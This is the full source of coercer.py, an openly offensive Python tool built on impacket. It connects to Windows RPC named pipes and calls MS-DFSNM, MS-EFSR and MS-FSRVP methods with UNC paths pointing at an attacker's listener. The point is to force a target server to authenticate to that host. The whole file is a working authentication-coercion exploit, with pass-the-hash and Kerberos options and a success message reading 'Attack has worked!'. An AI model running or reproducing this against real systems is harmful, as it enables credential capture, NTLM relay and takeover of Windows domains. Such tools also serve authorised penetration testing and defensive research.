#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coercer.py
# Author             : Podalirius (@podalirius_)
# Date created       : 29 Jun 2022

import argparse
import sys
import time

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin


VERSION = "1.1"


def connect_to_pipe(pipe, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None, verbose=False):
    ncan_target = r'ncacn_np:%s[%s]' % (target, pipe)
    __rpctransport = transport.DCERPCTransportFactory(ncan_target)

    if hasattr(__rpctransport, 'set_credentials'):
        __rpctransport.set_credentials(
            username=username,
            password=password,
            domain=domain,
            lmhash=lmhash,
            nthash=nthash
        )

    if doKerberos == True:
        __rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
    if targetIp is not None:
        __rpctransport.setRemoteHost(targetIp)

    dce = __rpctransport.get_dce_rpc()
    # dce.set_auth_type(RPC_C_AUTHN_WINNT)
    # dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

    if verbose:
        print("         [>] Connecting to %s ... " % ncan_target, end="")
    sys.stdout.flush()
    try:
        dce.connect()
    except Exception as e:
        if verbose:
            print("\x1b[1;91mfail\x1b[0m")
            print("      [!] Something went wrong, check error status => %s" % str(e))
        return None
    else:
        if verbose:
            print("\x1b[1;92msuccess\x1b[0m")
        return dce


def can_bind_to_protocol(dce, uuid, version, verbose=False):
    if verbose:
        print("         [>] Binding to <uuid='%s', version='%s'> ... " % (uuid, version), end="")
    sys.stdout.flush()
    try:
        dce.bind(uuidtup_to_bin((uuid, version)))
    except Exception as e:
        if verbose:
            print("\x1b[1;91mfail\x1b[0m")
            print("         [!] Something went wrong, check error status => %s" % str(e))
        if "STATUS_PIPE_DISCONNECTED" in str(e):
            # SMB SessionError: STATUS_PIPE_DISCONNECTED()
            return False
        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
            # SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
            return False
        elif "STATUS_ACCESS_DENIED" in str(e):
            # SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
            return False
        elif "abstract_syntax_not_supported" in str(e):
            # Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint)
            return False
        elif "Unknown DCE RPC packet type received" in str(e):
            # Unknown DCE RPC packet type received: 11
            return False
        elif "Authentication type not recognized" in str(e):
            # DCERPC Runtime Error: code: 0x8 - Authentication type not recognized
            return False
        else:
            return True
    else:
        if verbose:
            print("\x1b[1;92msuccess\x1b[0m")
        return True


#================================================================================

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return '[!] SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return '[!] SessionError: unknown error code: 0x%x' % self.error_code


class RPCProtocol(object):
    """
    Documentation for class RPCProtocol
    """

    uuid = None
    version = None

    auth_type = None
    auth_level = None
    pipe = None

    available_pipes = []

    ncan_target = None
    __rpctransport = None
    dce = None

    verbose = False
    debug = False

    def __init__(self, verbose=False):
        super(RPCProtocol, self).__init__()
        self.verbose = verbose

    def connect(self, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None):
        self.ncan_target = r'ncacn_np:%s[%s]' % (target, self.pipe)
        self.__rpctransport = transport.DCERPCTransportFactory(self.ncan_target)

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash
            )

        if doKerberos == True:
            self.__rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp is not None:
            self.__rpctransport.setRemoteHost(targetIp)

        self.dce = self.__rpctransport.get_dce_rpc()
        if self.auth_type is not None:
            self.dce.set_auth_type(self.auth_type)
        if self.auth_level is not None:
            self.dce.set_auth_level(self.auth_level)

        if self.verbose:
            print("         [>] Connecting to %s ... " % self.ncan_target, end="")
        sys.stdout.flush()
        try:
            self.dce.connect()
        except Exception as e:
            if self.verbose:
                print("\x1b[1;91mfail\x1b[0m")
                print("         [!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            if self.verbose:
                print("\x1b[1;92msuccess\x1b[0m")

        if self.verbose:
            print("         [>] Binding to <uuid='%s', version='%s'> ... " % (self.uuid, self.version), end="")
        sys.stdout.flush()
        try:
            self.dce.bind(uuidtup_to_bin((self.uuid, self.version)))
        except Exception as e:
            if self.verbose:
                print("\x1b[1;91mfail\x1b[0m")
                print("         [!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            if self.verbose:
                print("\x1b[1;92msuccess\x1b[0m")

        return True

    @classmethod
    def list_coerce_methods(cls):
        return []

    def perform_coerce_calls(self, listener):
        pass

#================================================================================[MS-DFSNM]

class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),   # Type: WCHAR *
        ('ApiFlags', DWORD)    # Type: DWORD
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = ()


class MS_DFSNM(RPCProtocol):
    name = "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol"
    uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
    version = "3.0"
    available_pipes = [r"\PIPE\netdfs"]

    def NetrDfsRemoveStdRoot(self, listener):
        if self.dce is not None:
            print("         [>] Calling NetrDfsRemoveStdRoot() ...")
            try:
                request = NetrDfsRemoveStdRoot()
                request['ServerName'] = '%s\x00' % listener
                request['RootShare'] = 'share'
                request['ApiFlags'] = 1
                if self.debug:
                    request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                if self.verbose:
                    print("   [!]", e)
        else:
            if self.verbose:
                print("   [!] Error: dce is None, you must call connect() first.")

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("NetrDfsRemoveStdRoot", 13, None)
        ]

    def perform_coerce_calls(self, listener):
        self.NetrDfsRemoveStdRoot(listener)

#================================================================================[MS-ESFR]

class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = ()


class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
        ('long', LONG),      # Type: unsigned
    )


class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = ()


class EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (
        ('FileName', WSTR),   # Type: wchar_t *
        ('InfoClass', DWORD)  # Type: DWORD
    )


class EfsRpcFileKeyInfoResponse(NDRCALL):
    structure = ()


class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('FileName', WSTR), # Type: wchar_t *
        ('Flags', LONG), # Type: long
    )


class EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    structure = ()


class EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = ()


class MS_EFSR(RPCProtocol):
    name = "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol"
    uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
    version = "1.0"
    available_pipes = [r"\PIPE\lsarpc", r"\PIPE\efsrpc"]

    auth_type = RPC_C_AUTHN_WINNT
    auth_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY

    def EfsRpcEncryptFileSrv(self, listener):
        if self.dce is not None:
            print("         [>] Calling EfsRpcEncryptFileSrv() ...")
            try:
                request = EfsRpcEncryptFileSrv()
                request['FileName'] = '\\\\%s\\share\\settings.ini\x00' % listener
                if self.debug:
                    request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                if self.verbose:
                    print('[!]', e)
        else:
            if self.verbose:
                print("   [!] Error: dce is None, you must call connect() first.")

    def EfsRpcDecryptFileSrv(self, listener):
        if self.dce is not None:
            print("         [>] Calling EfsRpcDecryptFileSrv() ...")
            try:
                request = EfsRpcDecryptFileSrv()
                request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                request['long'] = 0
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                if self.verbose:
                    print('[!]', e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcFileKeyInfo(self, listener):
        if self.dce is not None:
            print("         [>] Calling EfsRpcFileKeyInfo() ...")
            try:
                request = EfsRpcFileKeyInfo()
                request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                request['InfoClass'] = 0
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                if self.verbose:
                    print('[!]', e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcOpenFileRaw(self, listener):
        if self.dce is not None:
            print("         [>] Calling EfsRpcOpenFileRaw() ...")
            try:
                request = EfsRpcOpenFileRaw()
                request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                request['Flags'] = None
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                if self.verbose:
                    print('[!]', e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcQueryRecoveryAgents(self, listener):
        if self.dce is not None:
            print("         [>] Calling EfsRpcQueryRecoveryAgents() ...")
            try:
                request = EfsRpcQueryRecoveryAgents()
                request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                if self.verbose:
                    print('[!]', e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcQueryUsersOnFile(self, listener, max_retries=3):
        if self.dce is not None:
            print("         [>] Calling EfsRpcQueryUsersOnFile() ...")
            tries = 0
            while tries <= max_retries:
                tries += 1
                try:
                    request = EfsRpcQueryUsersOnFile()
                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                    # request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("           | Got (0x7b):ERROR_INVALID_NAME | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("           | Got (0x35):ERROR_BAD_NETPATH | Attack has worked!")
                        return True
        else:
            print("[!] Error: dce is None, you must call connect() first.")
        return False

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("EfsRpcEncryptFileSrv", 4, None),
            ("EfsRpcDecryptFileSrv", 5, None),
            ("EfsRpcFileKeyInfo", 12, None),
            ("EfsRpcOpenFileRaw", 0, None),
            ("EfsRpcQueryRecoveryAgents", 7, None),
            ("EfsRpcQueryUsersOnFile", 6, None)
        ]

    def perform_coerce_calls(self, listener):
        self.EfsRpcEncryptFileSrv(listener)
        self.EfsRpcDecryptFileSrv(listener)
        self.EfsRpcFileKeyInfo(listener)
        self.EfsRpcOpenFileRaw(listener)
        self.EfsRpcQueryRecoveryAgents(listener)
        self.EfsRpcQueryUsersOnFile(listener)

#================================================================================[MS-DFSNM]

class IsPathShadowCopied(NDRCALL):
    opnum = 9
    structure = (
        ('ShareName', WSTR),  # Type: LPWSTR
    )


class IsPathShadowCopiedResponse(NDRCALL):
    structure = ()


class IsPathSupported(NDRCALL):
    opnum = 8
    structure = (
        ('ShareName', WSTR),  # Type: LPWSTR
    )


class IsPathSupportedResponse(NDRCALL):
    structure = ()


class MS_FSRVP(RPCProtocol):
    name = "[MS-FSRVP]: File Server Remote VSS Protocol"
    uuid = "a8e0653c-2744-4389-a61d-7373df8b2292"
    version = "1.0"
    available_pipes = [r"\PIPE\Fssagentrpc"]

    auth_type = RPC_C_AUTHN_WINNT
    auth_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY

    def IsPathShadowCopied(self, listener, share="NETLOGON"):
        if self.dce is not None:
            print("         [>] Calling IsPathShadowCopied() ...")
            try:
                request = IsPathShadowCopied()
                request['ShareName'] = '\\\\%s\\%s\x00' % (listener, share)
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def IsPathSupported(self, listener, share="NETLOGON"):
        if self.dce is not None:
            print("[>] Calling IsPathSupported() ...")
            try:
                request = IsPathSupported()
                request['ShareName'] = '\\\\%s\\%s\\\x00' % (listener, share)
                if self.debug:
                    request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                if self.verbose:
                    print(e)
        else:
            if self.verbose:
                print("[!] Error: dce is None, you must call connect() first.")

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("IsPathShadowCopied", 9, None),
            ("IsPathSupported", 8, None)
        ]

    def perform_coerce_calls(self, listener):
        self.IsPathSupported(listener)
        self.IsPathShadowCopied(listener)

#================================================================================[MS-DFSNM]

banner = """
   ______                              
  / ____/___  ___  _____________  _____
 / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
/ /___/ /_/ /  __/ /  / /__/  __/ /      v%s
\____/\____/\___/_/   \___/\___/_/       by @podalirius_
""" % VERSION

available_protocols = [
    MS_DFSNM, MS_EFSR, MS_FSRVP # MS_SAMR, MS_RPRN, MS_PAR
]

if __name__ == '__main__':
    print(banner)
    parser = argparse.ArgumentParser(add_help=True, description="A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through 8 methods.")

    parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
    parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
    parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="")
    parser.add_argument("-a", "--analyze", default=False, action="store_true", help="")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")

    parser.add_argument("listener", help="IP address or hostname of listener")
    parser.add_argument("target", help="IP address or hostname of target")

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")

    # Getting all pipes of implemented protocols
    all_pipes = []
    for protocol in available_protocols:
        all_pipes += protocol.available_pipes
    all_pipes = list(sorted(set(all_pipes)))
    if options.verbose:
        print("[+] Found %d pipes." % len(all_pipes))

    # Getting available pipes
    detected_available_pipes = []
    if len(options.username) != 0 and len(options.password) != 0:
        if len(options.domain) != 0:
            print("[>] Searching available pipes (\x1b[1;92mauthenticated\x1b[0m) as '%s\\%s' on the remote machine ..." % (options.domain, options.username))
        else:
            print("[>] Searching available pipes (\x1b[1;92mauthenticated\x1b[0m) as '%s') on the remote machine ..." % options.username)
    else:
        print("[>] Searching available pipes (\x1b[1;91munauthenticated\x1b[0m) on the remote machine ...")
    for pipe in all_pipes:
        dce = connect_to_pipe(
            pipe=pipe,
            username=options.username,
            password=options.password,
            domain=options.domain,
            lmhash=lmhash,
            nthash=nthash,
            target=options.target,
            doKerberos=options.kerberos,
            dcHost=options.dc_ip,
            targetIp=options.target_ip,
            verbose=options.verbose
        )
        if dce is not None:
            print("   [>] Pipe '%s' is \x1b[1;92maccessible\x1b[0m!" % pipe)
            detected_available_pipes.append(pipe)
        else:
            if options.verbose or options.analyze:
                print("   [>] Pipe '%s' is \x1b[1;91mnot accessible\x1b[0m!" % pipe)

    # Coercing authentications

    if options.analyze:
        print("\n[>] Analyzing available protocols and interesting calls ...")
    else:
        print("\n[>] Analyzing available protocols and perform RPC calls to coerce authentication to %s ..." % options.listener)

    for pipe in detected_available_pipes:
        print("   [>] Through pipe '%s':" % pipe)
        for protocol in available_protocols:
            if pipe in protocol.available_pipes:
                dce = connect_to_pipe(
                    pipe=pipe,
                    username=options.username,
                    password=options.password,
                    domain=options.domain,
                    lmhash=lmhash,
                    nthash=nthash,
                    target=options.target,
                    doKerberos=options.kerberos,
                    dcHost=options.dc_ip,
                    targetIp=options.target_ip,
                    verbose=options.verbose
                )
                if dce is not None:
                    if can_bind_to_protocol(dce, protocol.uuid, protocol.version, verbose=options.verbose):
                        print("      [>] %s (uuid=%s, version=%s)" % (protocol.name, protocol.uuid, protocol.version))
                        if options.analyze:
                            for method, opnum, comment in protocol.list_coerce_methods():
                                if comment is not None:
                                    print("         [>] %s (opnum %d) | %s" % (method, opnum, comment))
                                else:
                                    print("         [>] %s (opnum %d) " % (method, opnum))
                        else:
                            protocol_instance = protocol(verbose=options.verbose)
                            protocol_instance.pipe = pipe
                            protocol_instance.connect(
                                username=options.username,
                                password=options.password,
                                domain=options.domain,
                                lmhash=lmhash,
                                nthash=nthash,
                                target=options.target,
                                doKerberos=options.kerberos,
                                dcHost=options.dc_ip,
                                targetIp=options.target_ip
                            )
                            protocol_instance.perform_coerce_calls(options.listener)

    print("\n[+] All done!")
